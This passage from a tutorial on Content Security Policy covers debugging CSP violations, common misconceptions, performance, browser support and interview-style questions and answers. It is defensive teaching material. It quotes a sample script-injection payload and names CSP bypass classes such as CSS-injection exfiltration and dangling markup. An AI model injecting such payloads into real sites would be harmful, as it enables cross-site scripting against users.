          "Add domain to script-src",
          "Use 'strict-dynamic' if script loaded by trusted script",
          "Host script on allowed domain",
          "Use integrity attribute"
        ]
      },
      
      error4: {
        message: "Refused to apply inline style because it violates CSP directive 'style-src'",
        cause: "Inline style or style attribute blocked",
        solutions: [
          "Move styles to external stylesheet",
          "Add nonce to <style> tag",
          "Add 'unsafe-inline' for style-src",
          "Use classes instead of style attributes"
        ]
      }
    };
  }

  // CSP testing tools
  static testingTools() {
    return {
      browser: {
        chrome: [
          'DevTools Console shows CSP errors',
          'Network tab shows blocked requests',
          'Lighthouse audit checks CSP'
        ],
        firefox: [
          'Console shows detailed CSP violations',
          'Network tab marks blocked requests',
          'Can disable CSP via devtools.policy.csp.enabled'
        ]
      },
      
      online: {
        cspEvaluator: {
          url: 'https://csp-evaluator.withgoogle.com/',
          features: ['Evaluates CSP strength', 'Identifies bypasses', 'Recommendations']
        },
        reportUri: {
          url: 'https://report-uri.com/home/generate',
          features: ['CSP generator', 'Policy testing', 'Reporting']
        }
      },
      
      cli: {
        cspParser: 'npm install -g csp-parse',
        usage: 'csp-parse "default-src \'self\'"'
      }
    };
  }

  // Step-by-step debugging guide
  static debuggingGuide() {
    return {
      step1: {
        action: 'Open Browser DevTools Console',
        lookFor: 'CSP violation messages',
        info: 'Messages show which directive was violated and what was blocked'
      },
      
      step2: {
        action: 'Check Network Tab',
        lookFor: 'Red requests with "blocked:csp" status',
        info: 'Shows which resources failed to load'
      },
      
      step3: {
        action: 'Identify Violated Directive',
        example: "'script-src' violated by inline script",
        nextStep: 'Determine appropriate fix for that directive'
      },
      
      step4: {
        action: 'Test Fix in Report-Only Mode',
        how: 'Use Content-Security-Policy-Report-Only header',
        benefit: 'Won\'t break site while testing'
      },
      
      step5: {
        action: 'Implement Fix',
        options: [
          'Add nonce/hash',
          'Move to external resource',
          'Add domain to allowlist',
          'Refactor code'
        ]
      },
      
      step6: {
        action: 'Verify Fix',
        checks: [
          'No console errors',
          'All resources loading',
          'Functionality working'
        ]
      },
      
      step7: {
        action: 'Monitor Production',
        setup: 'Configure CSP reporting',
        review: 'Check reports for unexpected violations'
      }
    };
  }
}
```

## Common Misconceptions

### Misconception 1: "CSP prevents all XSS attacks"

**Reality:** CSP is defense-in-depth, not a complete solution. It mitigates XSS but doesn't prevent vulnerabilities.

```javascript
const cspLimitations = {
  stillVulnerable: [
    'DOM-based XSS in client-side code',
    'XSS via allowed domains (if compromised)',
    'CSS injection attacks (data exfiltration)',
    'Dangling markup injection'
  ],
  
  cspHelps: 'Blocks execution of injected scripts',
  mustAlso: [
    'Input validation',
    'Output encoding',
    'Secure coding practices'
  ]
};
```

### Misconception 2: "'unsafe-inline' with nonces is secure"

**Reality:** Nonces completely override 'unsafe-inline' in modern browsers, but older browsers ignore nonces and allow all inline scripts.

```javascript
const nonceSecurityConsideration = {
  modern: "Nonce works, 'unsafe-inline' ignored",
  legacy: "'unsafe-inline' allows all inline scripts",
  
  solution: {
    csp: "script-src 'nonce-{random}' 'unsafe-inline' 'strict-dynamic' https:; object-src 'none'; base-uri 'none'",
    explanation: [
      "Modern: Uses nonce + strict-dynamic",
      "Legacy: Falls back to unsafe-inline + https:",
      "strict-dynamic overrides unsafe-inline in modern browsers"
    ]
  }
};
```

### Misconception 3: "CSP Report-Only mode doesn't affect performance"

**Reality:** Violations still generate reports which consume resources.

```javascript
const reportOnlyImpact = {
  overhead: [
    'Browser still parses and evaluates CSP',
    'Violation reports generated and sent',
    'Network requests for report endpoints'
  ],
  
  mitigation: [
    'Use sampling for high-traffic sites',
    'Batch reports',
    'Filter false positives client-side'
  ]
};
```

### Misconception 4: "Meta tag CSP is equivalent to header"

**Reality:** Some directives don't work in meta tags.

```javascript
const metaTagLimitations = {
  notSupported: [
    'report-uri',
    'report-to',
    'frame-ancestors',
    'sandbox'
  ],
  
  recommendation: 'Use HTTP headers when possible',
  metaTagUse: 'Fallback or CDN scenarios where headers unavailable'
};
```

## Performance Implications

### CSP Processing Overhead

```javascript
// Performance impact of CSP
class CSPPerformance {
  static measureOverhead() {
    return {
      parsing: {
        impact: 'Minimal - browser parses CSP header once',
        typical: '< 1ms for most policies'
      },
      
      checking: {
        impact: 'Per-resource check against policy',
        typical: '< 0.1ms per check',
        note: 'Negligible compared to network latency'
      },
      
      reporting: {
        impact: 'Network request per violation',
        mitigation: [
          'Batch reports',
          'Use report-only for testing',
          'Filter false positives'
        ]
      },
      
      nonceGeneration: {
        impact: 'Per-request server-side computation',
        typical: '< 1ms',
        bestPractice: 'Use crypto.randomBytes (fast)'
      },
      
      hashGeneration: {
        impact: 'Build-time only',
        runtime: 'Zero overhead'
      }
    };
  }

  // Optimizing CSP for performance
  static optimizations() {
    return {
      opt1: {
        name: 'Cache CSP header generation',
        example: `
          // Cache static part of CSP
          const baseCSP = "default-src 'self'; object-src 'none'";
          
          // Only generate nonce per request
          function generateCSP() {
            const nonce = generateNonce();
            return \`\${baseCSP}; script-src 'self' 'nonce-\${nonce}'\`;
          }
        `
      },
      
      opt2: {
        name: 'Use hashes for static content',
        benefit: 'No per-request nonce generation',
        tradeoff: 'Requires build step'
      },
      
      opt3: {
        name: 'Minimize reporting in production',
        approach: [
          'Use sampling (report 10% of violations)',
          'Report-only for new directives',
          'Filter known false positives'
        ]
      },
      
      opt4: {
        name: 'Consolidate directives',
        example: `
          // Instead of:
          "script-src 'self' https://cdn1.com; img-src 'self' https://cdn1.com"
          
          // Consider:
          "default-src 'self' https://cdn1.com"
          
          // Shorter header, easier to parse
        `
      }
    };
  }
}
```

## Browser Differences

### CSP Support Matrix

```javascript
const browserSupport = {
  chrome: {
    csp1: 'v25+ (2013)',
    csp2: 'v40+ (2015)',
    csp3: 'v59+ (2017)',
    features: {
      nonces: 'Full support',
      hashes: 'Full support',
      strictDynamic: 'v52+',
      reportTo: 'v70+',
      trustedTypes: 'v83+'
    },
    quirks: [
      'Max header size ~16KB',
      'Report-to requires JSON header'
    ]
  },
  
  firefox: {
    csp1: 'v23+ (2013)',
    csp2: 'v45+ (2016)',
    csp3: 'v58+ (2017)',
    features: {
      nonces: 'Full support',
      hashes: 'Full support',
      strictDynamic: 'v52+',
      reportTo: 'v65+',
      trustedTypes: 'Not supported'
    },
    quirks: [
      'Can disable CSP for testing',
      'Stricter about policy parsing'
    ]
  },
  
  safari: {
    csp1: 'v7+ (2013)',
    csp2: 'v10+ (2016)',
    csp3: 'v15.4+ (2022)',
    features: {
      nonces: 'v10+',
      hashes: 'v10+',
      strictDynamic: 'v15.4+',
      reportTo: 'v15.4+',
      trustedTypes: 'Not supported'
    },
    quirks: [
      'Slower to adopt new features',
      'Some directive variations'
    ]
  },
  
  edge: {
    legacy: 'Partial CSP2 support',
    chromium: 'Same as Chrome (v79+)',
    note: 'Use Chromium Edge (2020+)'
  },
  
  ie: {
    ie10: 'Basic CSP1 with X-Content-Security-Policy header',
    ie11: 'CSP1 support',
    recommendation: 'Not recommended to support'
  }
};

// Feature detection
class CSPFeatureDetection {
  static detectSupport() {
    return {
      nonces: 'No direct JS detection, check browser version',
      strictDynamic: 'Check violation events with test policy',
      reportTo: '"Report-To" in new Headers()',
      
      testPolicy: `
        // Set test CSP and check if violated
        const meta = document.createElement('meta');
        meta.httpEquiv = 'Content-Security-Policy';
        meta.content = "script-src 'none'";
        document.head.appendChild(meta);
        
        // Try to execute script
        const script = document.createElement('script');
        script.textContent = 'window.cspSupported = true;';
        document.head.appendChild(script);
        
        // If window.cspSupported not set, CSP blocked it
        const supported = !window.cspSupported;
      `
    };
  }
}
```

## Interview Questions

### Question 1: What is CSP and what types of attacks does it prevent?

**Answer:** Content Security Policy is a security header that defines which content sources are trusted. It primarily prevents XSS attacks by controlling where scripts, styles, and other resources can be loaded from. CSP also mitigates: clickjacking (via frame-ancestors), code injection, data injection, and mixed content. It works by creating an allowlist of approved sources for each resource type. Even if an attacker injects malicious code, CSP prevents it from executing by blocking unauthorized sources. It's defense-in-depth - doesn't replace input validation but adds a critical security layer.

### Question 2: Explain the difference between nonces and hashes in CSP. When would you use each?

**Answer:** Nonces are random values generated per request and added to inline scripts/styles via nonce attribute. They work with dynamic content and require server-side rendering to inject the nonce into both CSP header and HTML. Hashes are cryptographic hashes of the exact script/style content, generated at build time. They work with static content only because hash changes if content changes. Use nonces for: dynamic server-rendered pages, frequently changing content, SPAs with SSR. Use hashes for: static sites, CDN-served pages, fixed inline scripts, build-time generation. Modern approach: 'strict-dynamic' with nonces allows dynamic loading without allowlisting domains.

### Question 3: Why is 'unsafe-inline' dangerous and what are the secure alternatives?

**Answer:** 'unsafe-inline' allows all inline scripts and event handlers, completely defeating CSP's XSS protection. If an attacker injects `<script>alert('XSS')</script>`, it executes freely. This is dangerous because: XSS is the #1 web vulnerability, inline injection is the most common attack vector, and it makes other CSP directives pointless. Secure alternatives: 1) Use nonces for inline scripts - only scripts with matching nonce execute, 2) Use hashes for static inline content, 3) Move to external files, 4) Use 'strict-dynamic' for modern browsers, 5) Refactor event handlers to addEventListener in external scripts. Never use 'unsafe-inline' in production except for backwards compatibility with legacy browsers when combined with nonces.

### Question 4: How does 'strict-dynamic' work and what problem does it solve?

**Answer:** 'strict-dynamic' solves the domain allowlist maintenance problem. Traditional CSP requires listing every CDN/domain: `script-src 'self' https://cdn1.com https://cdn2.com...`. This is brittle and breaks when adding new dependencies. With 'strict-dynamic', a script with a valid nonce can load ANY other script dynamically, and those scripts are automatically trusted. CSP: `script-src 'nonce-{random}' 'strict-dynamic'`. Benefits: no domain allowlisting, dynamic loading works, automatically handles dependencies. In modern browsers, 'strict-dynamic' ignores 'unsafe-inline' and domain allowlists. Include https: fallback for older browsers. Only the initial scripts need nonces; all dynamically loaded scripts inherit trust.

### Question 5: What's the difference between Content-Security-Policy and Content-Security-Policy-Report-Only headers?

**Answer:** Content-Security-Policy enforces the policy - violations are blocked and reported. Content-Security-Policy-Report-Only reports violations but doesn't block - page works normally while collecting violation data. Use Report-Only for: testing new policies before deployment, monitoring without breaking production, gradually tightening policy, identifying all violation sources. You can send both headers simultaneously - one enforces baseline policy, other tests stricter policy. Best practice: deploy with Report-Only, collect violations for 1-2 weeks, analyze reports, fix issues, then switch to enforcing mode. This prevents accidentally breaking your site with overly strict CSP.

### Question 6: How do you handle third-party scripts (analytics, ads) with strict CSP?

**Answer:** Challenges: third-party scripts often use eval, inline scripts, load from multiple domains, and dynamically load additional scripts. Strategies: 1) Use 'strict-dynamic' with nonce - initial script loads third-party, which can load its dependencies, 2) Allowlist specific domains: `script-src 'self' https://www.googletagmanager.com`, 3) Use 'unsafe-eval' if required (not ideal), 4) Subresource Integrity (SRI) for CDN scripts, 5) Consider CSP-compatible alternatives, 6) Load third-party in iframe with separate CSP via sandbox. Google Tag Manager specifically: allowlist gtm domain, use nonce on GTM script, GTM's dynamically loaded scripts work with 'strict-dynamic'. Some ad networks incompatible with strict CSP - may need frame-based isolation.

### Question 7: What are Trusted Types and how do they complement CSP?

**Answer:** Trusted Types is a CSP feature (Chrome 83+) that prevents DOM XSS by requiring special objects for dangerous sinks like innerHTML, eval, and script.src. Enable via CSP: `require-trusted-types-for 'script'; trusted-types default`. Without Trusted Types, `element.innerHTML = userInput` is dangerous. With Trusted Types, must use: `element.innerHTML = trustedHTML`. Create Trusted Types via policies: `const policy = trustedTypes.createPolicy('name', {createHTML: (input) => DOMPurify.sanitize(input)})`. Browser enforces type checking - regular strings rejected at dangerous sinks. Complements CSP by: preventing XSS in application code (not just injected content), catching DOM XSS at runtime, providing safe APIs for necessary operations. Drawback: Chrome-only currently, requires code refactoring.

### Question 8: How do you debug CSP violations in production without getting overwhelmed by reports?

**Answer:** Strategies: 1) Filter false positives client-side before sending - ignore browser extensions (chrome-extension:, moz-extension:), browser features (about:, webkit-masked-url:), known third-party injections, 2) Batch reports - collect violations client-side, send in batches every few seconds, use navigator.sendBeacon for reliability, 3) Group by violation pattern - identical violations across multiple users = single issue, 4) Sample reporting - only report 10% of violations in high-traffic production, 5) Use Report-Only for new directives while enforcing baseline, 6) Set up alerting for spikes in new violation types, 7) Use third-party services (Report URI, Sentry) with built-in filtering and grouping, 8) Monitor patterns not individual violations - look for "100 users hit X violation" not every single occurrence. Always investigate sudden increases in violations.

## Key Takeaways

1. **Defense-in-Depth**: CSP is an additional security layer, not a replacement for input validation, output encoding, and secure coding practices. It mitigates XSS even when other defenses fail.

2. **Directive Hierarchy**: default-src is the fallback for all fetch directives. Specific directives (script-src, style-src) override default-src. Order: specific directive → default-src → blocked.

3. **Unsafe Directives Dangerous**: 'unsafe-inline' and 'unsafe-eval' defeat CSP's main purpose. They're only acceptable as legacy browser fallbacks when combined with nonces/hashes that modern browsers respect.

4. **Nonce Best Practice**: Generate unique cryptographic nonce per request, inject into CSP header and HTML, use for inline scripts/styles. Never reuse nonces across requests or store statically.

5. **Strict-Dynamic Modern Approach**: Combines nonces with 'strict-dynamic' to allow dynamic script loading without domain allowlisting. Ignores whitelist in modern browsers, falls back gracefully for old browsers.

6. **Report-Only for Testing**: Always deploy new CSP in Report-Only mode first, collect violations for 1-2 weeks, analyze and fix issues, then switch to enforcing. Prevents breaking production.

7. **Meta Tag Limitations**: CSP in meta tags doesn't support report-uri, report-to, frame-ancestors, or sandbox. Use HTTP headers when possible. Meta tags are fallback only.

8. **Reporting Requires Filtering**: Production CSP reports include browser extensions, injected scripts, and false positives. Filter client-side, batch reports, monitor patterns not individual violations.

9. **Frame-Ancestors Replaces X-Frame-Options**: frame-ancestors directive controls who can embed your page. More flexible than X-Frame-Options. Use 'none' for no embedding, 'self' for same-origin only.

10. **Browser Support Varies**: CSP Level 3 features (strict-dynamic, Trusted Types) require modern browsers. Include fallbacks for older browsers. Test across browsers - Safari slowest to adopt new features.

## Resources

### Official Specifications
- **CSP Level 3**: https://www.w3.org/TR/CSP3/
- **CSP Level 2**: https://www.w3.org/TR/CSP2/
- **MDN CSP**: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

### Tools
- **CSP Evaluator**: https://csp-evaluator.withgoogle.com/ - Analyze CSP strength
- **Report URI**: https://report-uri.com/ - CSP reporting service and generator
- **CSP Generator**: https://report-uri.com/home/generate

### Implementation Guides
- **Google CSP Guide**: https://csp.withgoogle.com/docs/index.html
- **OWASP CSP Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- **web.dev CSP**: https://web.dev/csp/

### Articles
- **CSP is Dead, Long Live CSP!**: https://research.google/pubs/csp-is-dead-long-live-csp/
- **Trusted Types**: https://web.dev/trusted-types/
- **Strict CSP**: https://csp.withgoogle.com/docs/strict-csp.html

### Browser Documentation
- **Chrome DevTools CSP**: https://developer.chrome.com/docs/devtools/security/
- **Firefox CSP**: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- **Safari CSP**: https://webkit.org/blog/7216/content-security-policy-2-0/
